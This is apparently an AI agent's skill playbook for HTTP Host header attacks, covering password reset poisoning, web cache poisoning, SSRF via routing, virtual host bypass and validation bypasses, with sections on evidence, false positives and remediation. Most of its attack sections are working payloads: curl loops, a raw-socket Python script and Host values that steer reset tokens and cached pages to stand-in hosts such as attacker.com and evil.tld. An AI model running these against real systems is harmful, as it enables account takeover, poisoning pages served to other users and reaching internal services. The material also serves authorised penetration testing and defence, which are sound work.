---
name: http-host-header-attacks
description: >-
  HTTP Host header injection and routing abuse playbook. Use when the application
  trusts the Host header for generating URLs, routing requests, or access control
  — enabling password reset poisoning, web cache poisoning, SSRF via routing,
  and virtual host bypass.
---

# SKILL: HTTP Host Header Attacks — Injection & Routing Abuse

> **AI LOAD INSTRUCTION**: Covers Host header injection for password reset poisoning, cache poisoning, SSRF via routing, and virtual host bypass. Includes bypass techniques for Host validation and framework-specific behaviors. Base models often miss the double-Host trick, absolute-URI override, and connection-state attacks.

## 0. RELATED ROUTING

- [web-cache-deception](../web-cache-deception/SKILL.md) when Host injection is combined with cache behavior
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) when Host header routes requests to internal services
- [open-redirect](../open-redirect/SKILL.md) when Host injection causes redirect to attacker domain
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when Host manipulation helps bypass WAF routing
- [request-smuggling](../request-smuggling/SKILL.md) when smuggling enables Host header manipulation past front-end validation
- [subdomain-takeover](../subdomain-takeover/SKILL.md) when Host routing exposes internal vhosts resolvable via subdomain

---

## 1. ATTACK SURFACE

The Host header is used by web applications and infrastructure for:

| Usage | Exploitation |
|---|---|
| URL generation (password reset links, email links) | Inject attacker domain → user clicks link to attacker |
| Virtual host routing | Spoof Host → access internal/admin vhost |
| Cache key component | Inject different Host → poison cache for all users |
| Reverse proxy routing | Host determines backend → SSRF to internal services |
| Access control decisions | Host-based ACLs can be bypassed |
| Canonical URL / SEO redirects | Host injection → open redirect |

---

## 2. PASSWORD RESET POISONING

The most common and impactful Host header attack.

### How It Works

```
1. Attacker requests password reset for victim@target.com
2. Attacker modifies Host header in the reset request:
   POST /forgot-password HTTP/1.1
   Host: attacker.com    ← injected
   
   email=victim@target.com

3. Server generates reset link using Host header value:
   "Click here to reset: https://attacker.com/reset?token=SECRET_TOKEN"

4. Victim receives email, clicks link → token sent to attacker
5. Attacker uses token on real target.com to reset password
```

### Testing

```http
POST /forgot-password HTTP/1.1
Host: attacker-collaborator.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

Check Burp Collaborator for incoming HTTP request with the reset token.

### Variants

- Some apps concatenate: `Host: target.com.attacker.com` → link becomes `https://target.com.attacker.com/reset?token=xxx`
- Some apps use only the port portion: `Host: target.com:@attacker.com` → parsed as `attacker.com` in some URL parsers

---

## 3. WEB CACHE POISONING VIA HOST

```
1. Attacker sends:
   GET / HTTP/1.1
   Host: attacker.com

2. If cache keys on URL path but NOT on Host header:
   → Response cached with attacker.com in generated links/content

3. Subsequent users requesting GET / receive the poisoned response
   → Links point to attacker.com, scripts load from attacker.com
```

**Key requirement**: Cache must not include Host header in cache key, but application must use Host in response body.

Test by sending two requests with different Host values and checking if the second request returns the first's Host in the response.

---

## 4. SSRF VIA HOST ROUTING

When a reverse proxy uses Host header to route to backends:

```
GET /api/internal HTTP/1.1
Host: internal-admin-panel.local

→ Reverse proxy routes request to internal-admin-panel.local
→ Attacker accesses internal service
```

Common in:
- Nginx `proxy_pass` based on `$host`
- Apache `ProxyPass` with virtual host routing
- Kubernetes Ingress controllers
- Cloud load balancers

---

## 5. VIRTUAL HOST BYPASS

Many servers host multiple applications on the same IP via virtual hosting:

```
Target:  Host: www.target.com  → public site
Hidden:  Host: admin.target.com → admin panel (not in public DNS)
Hidden:  Host: staging.target.com → staging environment
Hidden:  Host: localhost → server status page
```

### Discovery

```
1. Brute-force Host header with common vhost names:
   ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w vhosts.txt

2. Try special values:
   Host: localhost
   Host: 127.0.0.1
   Host: admin
   Host: internal
   Host: intranet

3. Compare response size/content to identify different vhosts
```

---

## 6. BYPASS TECHNIQUES WHEN HOST IS VALIDATED

### 6.1 Override Headers

Many frameworks/proxies trust these headers over the Host header:

| Header | Frameworks That Trust It |
|---|---|
| `X-Forwarded-Host` | Symfony, Laravel, Django (when `USE_X_FORWARDED_HOST=True`), Rails (behind proxy) |
| `X-Host` | Some custom proxy configurations |
| `X-Original-URL` | IIS with URL Rewrite module |
| `X-Rewrite-URL` | IIS with URL Rewrite module |
| `Forwarded: host=attacker.com` | RFC 7239 compliant proxies |
| `X-Forwarded-Server` | Apache mod_proxy |

Test all simultaneously:

```http
GET /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: /forgot-password
Forwarded: host=attacker.com
```

### 6.2 Absolute URL in Request Line

```http
GET http://attacker.com/path HTTP/1.1
Host: target.com
```

Per HTTP/1.1 spec (RFC 7230): if the request line contains an absolute URI, the Host header SHOULD be ignored. Some servers follow this, some don't — the mismatch between proxy and backend creates the vulnerability.

### 6.3 Double Host Header

```http
GET /path HTTP/1.1
Host: target.com
Host: attacker.com
```

Behavior varies:
- Some proxies validate first Host, app uses second
- Some servers concatenate: `target.com, attacker.com`
- RFC says: if both differ, return 400. Most servers don't.

### 6.4 Host with Port / Credentials

```http
Host: target.com:@attacker.com
Host: target.com:evil.com
Host: target.com#@attacker.com
Host: attacker.com%23@target.com
```

URL parsers may extract the "host" portion differently when credentials (`@`) or fragments (`#`) are present.

### 6.5 Trailing Dot

```http
Host: target.com.
```

DNS treats `target.com.` and `target.com` identically (trailing dot = FQDN). But Host validation may not strip the trailing dot → `target.com. ≠ target.com` in string comparison → bypass whitelist.

### 6.6 Tab / Space Injection

```http
Host: target.com\tattacker.com
Host: target.com attacker.com
```

Some parsers split on whitespace; the server may use `attacker.com` portion while validation checks `target.com` portion.

### 6.7 Wrap-Around / Enclosed Values

```http
Host: "attacker.com"
Host: <attacker.com>
```

Quoted or bracketed values may be stripped by the app but not by the validator.

---

## 7. FRAMEWORK-SPECIFIC BEHAVIOR

| Framework | Host Source | Gotcha |
|---|---|---|
| **PHP** | `$_SERVER['HTTP_HOST']` (raw header, directly injectable) | `SERVER_NAME` is safer only with `UseCanonicalName On` |
| **Django** | `HttpRequest.get_host()` checks X-Forwarded-Host first (if enabled) | `USE_X_FORWARDED_HOST=True` bypasses `ALLOWED_HOSTS` |
| **Rails** | `request.host` from Host header; trusts `X-Forwarded-Host` behind proxy | Rails 6+ `HostAuthorization` middleware mitigates |
| **Node/Express** | `req.hostname` / `req.headers.host`; with `trust proxy` uses X-Forwarded-Host | No built-in host validation |

---

## 8. CONNECTION-STATE ATTACKS

A sophisticated variant exploiting HTTP keep-alive:

```
Connection 1:
  Request 1: GET / HTTP/1.1    ← Valid Host: target.com
              Host: target.com     → Proxy validates, forwards, keeps connection open

  Request 2: GET /admin HTTP/1.1  ← Evil Host on SAME connection
              Host: evil.com       → Some proxies skip validation on subsequent requests
                                     (they validated the connection on first request)
```

This works against proxies that perform Host validation only on the first request of a keep-alive connection.

### Testing

```
1. Use Burp Repeater with "Connection: keep-alive"
2. Send normal request first
3. On same connection, send request with manipulated Host
4. Check if second request is processed differently
```

---

## 9. HOST HEADER ATTACK DECISION TREE

```
Application uses Host header in responses/behavior?
│
├── Test direct Host injection
│   ├── Change Host to attacker domain → reflected in response?
│   │   ├── YES → Check impact:
│   │   │   ├── In password reset emails? → PASSWORD RESET POISONING
│   │   │   ├── In cached responses? → WEB CACHE POISONING
│   │   │   ├── In redirects? → OPEN REDIRECT
│   │   │   └── In script/link URLs? → XSS VIA HOST
│   │   └── NO (400/403/different response) → Host is validated
│   │
│   └── Host validated? Try bypasses:
│       ├── X-Forwarded-Host header
│       ├── X-Host / X-Original-URL / Forwarded header
│       ├── Absolute URL in request line
│       ├── Double Host header
│       ├── Host: target.com:@attacker.com (URL parser confusion)
│       ├── Host: target.com. (trailing dot)
│       ├── Tab/space injection in Host value
│       └── Connection-state attack (valid first request, evil second)
│
├── Test virtual host enumeration
│   ├── Brute-force Host values against target IP
│   ├── Try: localhost, admin, staging, internal, intranet
│   └── Compare response sizes for different Host values
│
├── Test SSRF via Host routing
│   ├── Host: 127.0.0.1 → internal service?
│   ├── Host: internal-hostname.local → internal routing?
│   └── Host: 169.254.169.254 → cloud metadata?
│
└── No Host-based behavior found
    └── Check if app uses Host in server-side operations
        (email generation, webhook URLs, API callbacks)
```

---

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **Password reset poisoning doesn't require the victim to be logged in** — you request the reset, the victim just clicks the link. The token lands on your server.
2. **X-Forwarded-Host is the #1 missed bypass**: Most Host validation checks `Host` header but frameworks silently prefer `X-Forwarded-Host` when behind a proxy.
3. **Double Host header is protocol-valid but behavior-undefined**: RFC says reject with 400, but almost no server actually does this. The mismatch between proxy and app is the vulnerability.
4. **Absolute URI overrides Host per RFC**: `GET http://evil.com/path HTTP/1.1\nHost: target.com` — the spec says use the request-line URI. But not all implementations agree.
5. **Cache poisoning via Host requires the cache to exclude Host from the key**: Most CDNs include Host in the cache key. But custom Varnish/Nginx caches may not. Also test with `X-Forwarded-Host` as cache key differentiator.
6. **Connection-state attacks are rarely tested**: Automated scanners don't test keep-alive behavior. Manual testing via Burp Repeater's connection reuse is essential.
7. **DNS rebinding + Host attacks**: If you control DNS, point your domain to the target's IP → your domain resolves to their server → Host header says your domain, but request hits their server. Useful for bypassing IP-based access controls.

---

## 11. EXECUTION PRIMITIVES

A host-header finding is proven by **the application acting on a value you supplied in `Host`** - a
link in a password-reset mail, a poisoned cache entry, a routing decision, or a bypassed vhost guard.

### 11.1 Establish which value the application trusts per layer

```bash
# the same request with each host-bearing header, to see which one wins where
for H in "Host: target.tld" "Host: evil.tld" ; do
  echo "=== $H"
  curl -sS -o /tmp/hh -D /tmp/hd -w '%{http_code}\n' "https://target.tld/" -H "$H"
  grep -iE '^location|^set-cookie' /tmp/hd | head -3
done
# and each forwarding header separately, so attribution is unambiguous
for HDR in X-Forwarded-Host X-Host X-Forwarded-Server X-Original-URL X-Rewrite-URL \
           Forwarded X-Forwarded-For ; do
  curl -sS -o /tmp/hf -w "$HDR %{http_code}\n" "https://target.tld/" -H "$HDR: evil.tld"
done
```

Different components read different headers, and the **application, the framework, and the proxy may
each pick a different one**. Attribute the effect to a single header before writing anything up.

### 11.2 Password reset poisoning, with the mailbox as the oracle

```bash
# the reset link the application generates is the evidence
curl -sS -o /dev/null -X POST "https://target.tld/api/forgot" \
  -H 'Content-Type: application/json' -H 'Host: evil.tld' \
  -d '{"email":"victim@YOUR_DOMAIN"}'
sleep 10
# read the message you control and extract the link it contains
grep -oE 'https?://[^ ">]+' /path/to/maildrop/*.eml | head -5
```

A link pointing at `evil.tld` in a message the **target generated and sent** is the finding. If the
host is validated, the link points at the real domain - **record the control**. The mailbox is the only
acceptable oracle here; a reflected `Host` in a response is not proof that a mail would contain it.

### 11.3 Cache poisoning via the host header

```bash
# send with a host the cache keys on, then fetch the same URL with the legitimate host
curl -sS -o /tmp/c1 -D /tmp/cd1 -w 'prime %{http_code}\n' "https://target.tld/page" -H 'Host: target.tld' \
  -H 'X-Forwarded-Host: evil.tld'
grep -iE 'x-cache|age|cache-control|vary' /tmp/cd1
sleep 2
curl -sS -o /tmp/c2 -D /tmp/cd2 -w 'victim %{http_code}\n' "https://target.tld/page"
grep -icE 'evil\.tld' /tmp/c2
diff <(head -c 400 /tmp/c1) <(head -c 400 /tmp/c2) >/dev/null && echo "no change" || echo "cache entry differs"
```

A **second, independent request** receiving a page containing your host proves the cache key omits the
header. **Coordinate with the cache poisoning domain** for the key analysis - the deliverable here is
the host-header input to the cache.

### 11.4 SSRF and internal routing through the host header

```bash
# an application that builds a URL from Host can be pointed at itself or at a neighbour
curl -sS -o /tmp/s -w '%{http_code}\n' "https://target.tld/api/fetch" -H 'Host: 127.0.0.1:8080'
head -c 200 /tmp/s; echo
curl -sS -o /tmp/s2 -w '%{http_code}\n' "https://target.tld/api/fetch" -H 'Host: internal.tld'
head -c 200 /tmp/s2; echo
# and the absolute-URI form, which some servers accept in the request line
printf 'GET http://internal.tld/admin HTTP/1.1\r\nHost: target.tld\r\nConnection: close\r\n\r\n' | \
  openssl s_client -quiet -connect target.tld:443 -servername target.tld 2>/dev/null | head -20
```

An **internal page or an internal service response** is the proof. If the app rewrites the host or
validates it against a list, the response is the legitimate one - which tells you the control exists.

### 11.5 Virtual host bypass and access-control circumvention

```bash
# an internal vhost that trusts requests arriving with the internal Host value
for H in localhost 127.0.0.1 internal.tld admin.target.tld target.tld.internal; do
  R=$(curl -sS -o /tmp/v -w '%{http_code} %{size_download}' "https://target.tld/admin" -H "Host: $H")
  printf '%-24s %s  %s\n' "$H" "$R" "$(grep -oiE 'admin|denied|forbidden|not found' /tmp/v | head -1)"
done
# and the port-swap form, which some proxies route differently
for H in target.tld:8080 target.tld:8443 target.tld:8888; do
  curl -sS -o /dev/null -w "$H -> %{http_code}\n" "https://target.tld/admin" -H "Host: $H"
done
```

A **`200` with administrative content where the normal request returns `403`** is the finding. Run the
control first so the differential is explicit.

### 11.6 Validation bypass variants

```bash
B='https://target.tld'
for H in "target.tld.evil.tld" "evil.tld#target.tld" "target.tld@evil.tld" \
         "target.tld%2f@evil.tld" "target.tld\t" "target.tld:80@evil.tld" \
         "TARGET.TLD" "target.tld." "target.tld%00.evil.tld" "target.tld%20.evil.tld" ; do
  R=$(curl -sS -o /tmp/b -w '%{http_code}' "$B/" -H "Host: $H")
  printf '%-30s %s\n' "$H" "$R"
done
```

Substring checks (`if Host contains "target.tld"`), suffix checks without a trailing dot, and
case-sensitivity are the recurring validation bugs. **The bypass is proved by the effect, not by the
fact that the string was accepted** - check whether the poisoned link or routing appeared.

### 11.7 Connection-state and absolute-URI forms

```bash
# keep-alive reuse with a different Host on the second request on the same connection
python3 - <<'PY'
import socket, ssl
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
s = ctx.wrap_socket(socket.create_connection(("target.tld", 443)), server_hostname="target.tld")
s.sendall(b"GET / HTTP/1.1\r\nHost: target.tld\r\nConnection: keep-alive\r\n\r\n")
print(s.recv(400).decode(errors="replace").split("\r\n")[0])
s.sendall(b"GET /admin HTTP/1.1\r\nHost: internal.tld\r\nConnection: close\r\n\r\n")
print(s.recv(400).decode(errors="replace").split("\r\n")[0])
PY
# and the absolute-URI in the request line, which some proxies route by
curl -sS -o /dev/null -w 'absolute-uri %{http_code}\n' --request-target "http://evil.tld/admin" \
  "https://target.tld/" 2>/dev/null || echo "client cannot set a custom target; use a raw socket"
```

Different `Host` values on a **reused connection** exercise connection-state handling, and the
absolute-URI form bypasses proxies that validate only the `Host` header. Both are worth testing
whenever the first request on the connection succeeds.

### 11.8 Confirm with the effect, not the reflection

```bash
# control 1: the normal request
curl -sS -o /tmp/n1 -w 'normal   %{http_code} %{size_download}\n' "https://target.tld/"
# control 2: the header present with the legitimate value
curl -sS -o /tmp/n2 -w 'legit    %{http_code} %{size_download}\n' "https://target.tld/" -H 'X-Forwarded-Host: target.tld'
# test: the header with the attacker value
curl -sS -o /tmp/n3 -w 'attacker %{http_code} %{size_download}\n' "https://target.tld/" -H 'X-Forwarded-Host: evil.tld'
grep -oE 'https?://[a-z0-9.-]+' /tmp/n1 | sort -u | head -5; echo ---
grep -oE 'https?://[a-z0-9.-]+' /tmp/n3 | sort -u | head -5
```

Generate the link or the redirect with the **legitimate** header value too. If the application only
uses the header when a proxy is absent, both controls behave the same and there is no finding - **that
comparison is the check that prevents the most common false positive in this domain**.

---

## 12. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the application **use** the supplied host in a generated artefact (link, redirect, cache entry)? | the finding, as opposed to a reflected header |
| 2 | Which **specific header** caused the effect? | the fix location; proxies read different ones |
| 3 | Is the effect reachable by an **unauthenticated user**, on an endpoint that a victim would trigger? | severity |
| 4 | Does the **control request with the legitimate host** produce the correct artefact? | the difference is caused by your header |
| 5 | For reset poisoning: did a **message arrive with your host in the link**? | the only acceptable proof |
| 6 | For cache poisoning: did a **second independent request** receive the poisoned content? | a cache finding needs both halves |
| 7 | For a bypass: is there an **access-control difference** versus the normal request? | the impact |

**Use the artefact, not the reflection.** A `Host` echoed into a page is not a finding; a `Host` that
built the reset link, the redirect, or the cached page is.

---

## 13. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **request** with the exact header and value that triggered the effect | reproducible, and it names the fix target |
| The **generated artefact** - the reset link in the delivered mail, the `Location` header, the cached body | the effect is the evidence |
| The **control request** with the legitimate host, showing the correct artefact | proves causation |
| The **header attributed** as the cause, when several host-bearing headers exist | proxies and frameworks differ |
| For reset poisoning: the **raw message with headers and timestamps** from a mailbox you control | proves the target generated the poisoned link |
| For cache poisoning: the **priming request**, the **victim request**, and the cache headers on both | a cache finding is two requests |
| The **validation present** and the form that bypassed it | the fix must cover the bypass |
| **Negative control** - an invalid host is rejected or ignored | shows your form is special, not that validation is absent |
| The **component** the effect came from (app, framework, proxy) where identifiable | the fix owner |
| A statement that no **victim account** was accessed and no message was sent to a third party | scope discipline |

Report the **header, the artefact, and the control**: "`POST /api/forgot` builds the reset link from
`X-Forwarded-Host`; sending the request with `X-Forwarded-Host: evil.tld` and the victim's address
produced a message at my drop containing `https://evil.tld/reset?token=...`, while the same request
with `X-Forwarded-Host: target.tld` produced `https://target.tld/reset?token=...`; the token is
therefore deliverable to an attacker-controlled origin", never "the application is vulnerable to host
header injection".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The `Host` header is reflected in the response body | reflection is not a routing or link decision |
| A redirect to the host you sent, on an endpoint that always redirects to `Host` | no victim-visible effect; prove an impact or drop it |
| A reset mail you requested for your **own** account | not an attack on another user |
| An effect you cannot reproduce with the legitimate-host control | the difference is not caused by your value |
| A cache header changing without a second request receiving the content | unproven cache effect |
| A bypass that returns the same content as the normal request | no access-control difference |
| An invalid host rejected with `400` | the validation works |
| The application building an **absolute URL from a configured value**, not from the header | the host is not attacker-controlled |
| A poisoned link that the application only uses for internal logging | no user-visible effect |
| A host value accepted by the proxy but normalised before the app reads it | no effect at the sink |
| A differential caused by a load balancer routing you to a different node | not host-based |
| A finding demonstrated by editing the request with no delivery path a victim could follow | not reachable |

**Run the legitimate-host control every time.** It is the single check that removes most false
positives in this domain.

---

## 14. REMEDIATION REFERENCE

1. **Do not use the `Host` header to build URLs** - derive absolute URLs from a configured base URL, which removes the entire class instead of filtering one header.
2. **Validate `Host` against an explicit allowlist, with exact matching** - substring and suffix checks are the recurring bug, and a trailing dot or a case change defeats them; compare the full host against a fixed set.
3. **Configure the framework's trusted-host setting** - Django's `ALLOWED_HOSTS`, Rails' `config.hosts`, ASP.NET Core's `AllowedHosts`, and the equivalents either reject or normalise, and they are one configuration line each.
4. **Rewrite the host at the edge and strip inbound forwarding headers** - `X-Forwarded-Host`, `X-Host`, and `X-Forwarded-Server` from the client must never reach the application; the proxy sets its own.
5. **Include the host in the cache key, or strip the header before caching** - cache poisoning through a host header is a cache-key defect, and the fix belongs in the cache configuration as well as the application.
6. **Never route by a client-supplied host to an internal service** - the vhost bypass and the SSRF variant both depend on the host being used for routing, so route by the listener instead.
7. **Reject absolute-URI request targets unless a proxy specifically requires them** - the request-line form bypasses header validation in several proxies.
8. **Generate absolute links from the request only after the host has been validated** - if the framework offers a validated-host mechanism, use it rather than re-implementing the check.
9. **Bind internal vhosts to internal listeners** - an admin vhost reachable from the internet with a `Host` value is an exposure, independent of the header-parsing bug.
10. **Log and alert on anomalous `Host` values** - a host that is not in your allowlist received on a production listener is high-signal and cheap to detect.
11. **Add a regression test with a hostile `Host`** - assert that a reset link, a redirect, and a cached page never contain an unvalidated host, which detects the regression a framework upgrade would introduce.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER

- [attack-host-header](../attack-host-header/SKILL.md) - the companion playbook for the same vector
- [web-cache-deception](../web-cache-deception/SKILL.md) - the cache-key analysis for the poisoning variant
- [open-redirect](../open-redirect/SKILL.md) - the redirect sink a host header feeds
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) - the internal-routing variant
- [401-403-bypass-techniques](../401-403-bypass-techniques/SKILL.md) - the access-control differential to prove
